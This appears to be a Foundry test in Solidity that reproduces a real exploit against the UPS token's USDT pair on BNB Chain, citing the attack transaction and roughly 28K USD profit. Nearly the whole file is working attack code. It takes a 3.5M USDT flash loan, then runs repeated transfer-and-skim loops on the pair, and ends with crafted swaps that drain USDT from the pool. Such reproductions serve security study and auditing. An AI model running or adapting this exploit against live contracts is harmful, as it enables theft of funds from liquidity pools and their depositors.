// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// TX : https://app.blocksec.com/explorer/tx/bsc/0xd03702e17171a32464ce748b8797008d59e2dbcecd3b3847d5138414566c886d
// GUY : https://twitter.com/0xNickLFranklin/status/1777589021058728214
// Profit : ~ 28K USD
// REASON : business logic flaw XD transfer to pair won't lead to pair's amount change

contract ContractTest is Test {
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 UPS = IERC20(0x3dA4828640aD831F3301A4597821Cc3461B06678);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Uni_Pair_V3 pool = Uni_Pair_V3(0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb);
    Uni_Pair_V2 ups_usdt = Uni_Pair_V2(0xA2633ca9Eb7465E7dB54be30f62F577f039a2984); 
    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    uint256 borrow_amount;
    function setUp() external 
    {
        cheats.createSelectFork("bsc", 37680754);
        deal(address(USDT),address(this),0);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker USDT before exploit", USDT.balanceOf(address(this)), 18);
        borrow_amount = 3_500_000 ether;
        pool.flash(address(this),borrow_amount,0,"");
        emit log_named_decimal_uint("[End] Attacker USDT after exploit", USDT.balanceOf(address(this)), 18);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, /*fee1*/ bytes memory /*data*/ ) public {
        USDT.transfer(address(ups_usdt),2_000_000 ether);
        ups_usdt.sync();
        swap_token_to_token(address(USDT),address(UPS),1_000_000 ether);
        uint256 i = 0;
        uint256 pair_balance = 0;
        uint256 here_balance = 0;
        uint256 transfer_amount = 0;
        while(i < 10) {
            pair_balance = UPS.balanceOf(address(ups_usdt));
            here_balance = UPS.balanceOf(address(address(this)));
            console.log(">>>>",here_balance,pair_balance,"<<<<");
            if (here_balance > pair_balance){
                transfer_amount = pair_balance;
            }else{
                transfer_amount = here_balance;
            }
            UPS.transfer(address(ups_usdt),transfer_amount);
            ups_usdt.skim(address(this));
            i ++;
        }
        i = 0;
        while(i<3){
            transfer_amount = UPS.balanceOf(address(ups_usdt));
            UPS.transfer(address(ups_usdt),transfer_amount);
            (uint256 r0, uint256 r1,) = ups_usdt.getReserves();
            uint256 amountOut = router.getAmountOut(transfer_amount - r0, r0, r1);
            ups_usdt.swap(0,amountOut,address(this),"");
            i++;
        }
        USDT.transfer(address(pool),borrow_amount + fee0);
    }

    function swap_token_to_token(address a,address b,uint256 amount) internal {
        IERC20(a).approve(address(router), amount);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }

}

